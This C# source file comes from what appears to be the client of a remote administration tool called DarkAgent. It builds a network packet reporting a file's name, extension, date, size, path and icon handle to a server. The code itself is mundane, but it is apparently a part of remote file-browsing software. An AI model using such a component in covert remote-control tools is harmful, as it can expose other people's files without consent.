using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;
using System.Runtime.InteropServices;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Send
{
    class S_FileMgrGetFiles : SendBasePacket
    {
        private FileMgrFileInfo info;
        public S_FileMgrGetFiles(ClientConnect client, FileMgrFileInfo info)
            : base(client)
        {
            this.info = info;
        }

        protected internal override void Write()
        {
            WriteByte(0x6);
            WriteString(info.FileName);
            WriteString(info.Extension);
            WriteString(info.Date);
            WriteString(info.Size);
            WriteString(info.FileLocation);

            APIs.SHFILEINFO shinfo = new APIs.SHFILEINFO();

            if(!info.FileLocation.EndsWith("\\"))
                info.FileLocation += "\\";

            IntPtr hImgSmall = APIs.SHGetFileInfo(info.FileLocation + info.FileName, 0, ref  shinfo, Marshal.SizeOf(shinfo), 0x100 | 0x1);
            WriteInteger((int)shinfo.hIcon); //Icon Handle
        }
    }
}
